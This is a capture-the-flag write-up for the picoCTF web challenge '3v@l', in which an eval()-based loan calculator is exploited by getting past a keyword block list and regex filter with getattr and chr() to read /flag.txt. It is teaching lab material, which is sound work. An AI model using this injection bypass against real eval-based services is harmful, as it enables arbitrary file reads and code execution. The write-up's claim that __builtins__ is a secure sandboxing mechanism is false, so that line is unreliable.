# **Writeup for Web CTF Challenge: "3v@l"**

---

## **1️⃣ Challenge Overview**

- **Challenge Name:** 3v@l
- **Category:** Web Exploitation
- **Description:**
    
    > ABC Bank's website has a loan calculator that uses the eval function to evaluate user input. However, this function is insecure and could lead to Remote Code Execution (RCE). Our goal is to exploit this vulnerability and read the flag stored in /flag.txt.
    > 

---

## **2️⃣ Understanding the Vulnerability**

To solve the challenge, we need to analyze the security flaw in the given website.

### **What is `eval()`?**

- `eval()` is a built-in function in **Python** that evaluates a string as if it were a piece of Python code.
- Example:
    
    ```python
    eval("2 + 2")  # Output: 4
    eval("print('Hello')")  # Output: Hello
    
    ```
    
- **The Issue with `eval()`:**
    - If `eval()` processes user input **without strict filtering**, an attacker can execute arbitrary Python commands.
    - This can lead to **Remote Code Execution (RCE)**, allowing us to access files, execute system commands, or manipulate data.

---

### **3️⃣ How We Identified the Vulnerabilities**

From the given source code, we noticed the following:

- **`eval()` is used** to evaluate the user input directly.
- **Some keywords are blocked**:
    
    ```
    os, eval, exec, bind, connect, python, socket, ls, cat, shell
    
    ```
    
- **A regex filter is applied**:

This means:
    
    ```
    r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'
    
    ```
    
    - **Hex encoding (`0x...`) is blocked**.
    - **Unicode encoding (`\uXXXX`) is blocked**.
    - **URL encoding (`%xx`) is blocked**.
    - **Dot (`.`) and slashes (`/` and `\`) are blocked**.

---

## **4️⃣ Exploitation Steps**

### **Step 1: Bypassing the `eval` Restriction**

- Since `eval()` is dangerous, Python provides a secure sandboxing mechanism through `__builtins__`, which holds all Python built-in functions.
- Normally, `open()` is accessed as:
    
    ```python
    open("/flag.txt").read()
    
    ```
    
- However, `open()` is not directly available in the challenge. But we know that **`open` exists inside `__builtins__`**.

### **Step 2: Accessing `open()` Without Using the Word "open"**

- We use `getattr()` to dynamically access attributes from objects.
- Instead of writing `"open"`, we construct it dynamically:
    
    ```python
    getattr(__builtins__, "open")
    
    ```
    
    - `getattr(__builtins__, "open")` fetches the `open()` function from built-in functions.

### **Step 3: Constructing the File Path Without `/` and `.`**

- Since slashes (`/`) and dots (`.`) are **blocked**, we can't directly type `/flag.txt`.
- Instead, we use `chr()` to construct them dynamically:
    - `/` (ASCII 47) → `chr(47)`
    - `.` (ASCII 46) → `chr(46)`
- Thus, `/flag.txt` is reconstructed as:
    
    ```python
    chr(47) + "flag" + chr(46) + "txt"
    
    ```
    

### **Step 4: Reading the Flag**

- Now, we combine everything:
    
    ```python
    getattr(__builtins__, chr(111) + chr(112) + chr(101) + chr(110))(chr(47) + 'flag' + chr(46) + 'txt').read()
    
    ```
    
    - `chr(111) + chr(112) + chr(101) + chr(110)` dynamically reconstructs `"open"`.
    - `chr(47) + 'flag' + chr(46) + 'txt'` reconstructs `"/flag.txt"`.
    - `getattr(__builtins__, "open")("/flag.txt").read()` is effectively executed.

### **Step 5: Submitting the Payload**

- We enter this payload into the loan calculator input:
    
    ```python
    getattr(__builtins__, chr(111) + chr(112) + chr(101) + chr(110))(chr(47) + 'flag' + chr(46) + 'txt').read()
    
    ```
    
- **Output:**
    
    ```
    picoCTF{D0nt_Use_Unsecure_f@nctions6798a2d8}
    
    ```
    
- **Success! 🎉 We got the flag!**
